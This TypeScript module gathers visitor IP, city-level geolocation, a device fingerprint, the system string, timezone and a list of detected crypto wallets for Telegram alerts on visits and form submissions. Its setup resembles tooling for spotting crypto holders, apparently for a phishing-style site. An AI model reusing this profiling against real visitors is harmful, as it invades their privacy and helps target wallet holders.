/**
 * Shared IP / geo / visitor meta for Telegram alerts (visit + form submissions).
 */

import { markVisitorSeen, visitorDeviceKey } from "@/lib/visitorStore";

export type VisitorMetaPayload = {
  deviceFingerprint?: string;
  system?: string;
  wallets?: string[] | string;
  timezone?: string;
  path?: string;
};

export type ResolvedVisitorContext = {
  visitorType: "New user" | "Returning user" | "Unknown";
  location: string;
  ip: string;
  system: string;
  wallets: string;
  timezone: string;
  path: string;
};

function normalizeIp(raw: string): string {
  let ip = raw.trim();
  if (ip.startsWith("::ffff:")) ip = ip.slice(7);
  return ip;
}

export function clientIp(request: Request): string {
  const xf = request.headers.get("x-forwarded-for");
  if (xf) {
    const first = xf.split(",")[0]?.trim();
    if (first) return normalizeIp(first);
  }
  const real = request.headers.get("x-real-ip")?.trim();
  if (real) return normalizeIp(real);
  const cf = request.headers.get("cf-connecting-ip")?.trim();
  if (cf) return normalizeIp(cf);
  const netlify = request.headers.get("x-nf-client-connection-ip")?.trim();
  if (netlify) return normalizeIp(netlify);
  return "unknown";
}

function isPrivateIp(ip: string): boolean {
  if (!ip || ip === "unknown") return true;
  if (ip === "127.0.0.1" || ip === "::1" || ip === "localhost") return true;
  if (ip.startsWith("192.168.") || ip.startsWith("10.")) return true;
  if (/^172\.(1[6-9]|2\d|3[0-1])\./.test(ip)) return true;
  return false;
}

export async function lookupLocation(ip: string): Promise<string> {
  if (isPrivateIp(ip)) return "Local development";

  try {
    const res = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,regionName,city`,
      { signal: AbortSignal.timeout(4000) },
    );
    if (!res.ok) return "Unknown";
    const data = (await res.json()) as {
      status?: string;
      country?: string;
      regionName?: string;
      city?: string;
    };
    if (data.status !== "success") return "Unknown";
    return [data.city, data.regionName, data.country].filter(Boolean).join(", ") || "Unknown";
  } catch {
    return "Unknown";
  }
}

function normalizeWallets(raw: VisitorMetaPayload["wallets"]): string[] {
  if (Array.isArray(raw)) {
    return raw.map((w) => String(w).trim().slice(0, 40)).filter(Boolean).slice(0, 20);
  }
  if (typeof raw === "string" && raw.trim()) {
    try {
      const parsed = JSON.parse(raw) as unknown;
      if (Array.isArray(parsed)) {
        return parsed.map((w) => String(w).trim().slice(0, 40)).filter(Boolean).slice(0, 20);
      }
    } catch {
      return raw
        .split(",")
        .map((w) => w.trim().slice(0, 40))
        .filter(Boolean)
        .slice(0, 20);
    }
  }
  return [];
}

/** Resolve visitor context from request headers + optional client meta. */
export async function resolveVisitorContext(
  request: Request,
  payload: VisitorMetaPayload = {},
): Promise<ResolvedVisitorContext> {
  const ip = clientIp(request);
  const ipKey = ip !== "unknown" ? ip : null;

  const fingerprintRaw = (payload.deviceFingerprint ?? "").trim().slice(0, 800);
  let visitorType: ResolvedVisitorContext["visitorType"] = "Unknown";

  if (fingerprintRaw.length >= 8) {
    try {
      const result = await markVisitorSeen(visitorDeviceKey(fingerprintRaw), ipKey);
      visitorType = result.returning ? "Returning user" : "New user";
    } catch (err) {
      console.error("[visitorContext] markVisitorSeen failed", err);
      visitorType = "New user";
    }
  }

  const wallets = normalizeWallets(payload.wallets);
  const location = await lookupLocation(ip);

  return {
    visitorType,
    location,
    ip,
    system: (payload.system ?? "Unknown").trim().slice(0, 160) || "Unknown",
    wallets: wallets.length > 0 ? wallets.join(", ") : "None detected",
    timezone: (payload.timezone ?? "Unknown").trim().slice(0, 80) || "Unknown",
    path: (payload.path ?? "/").trim().slice(0, 200) || "/",
  };
}
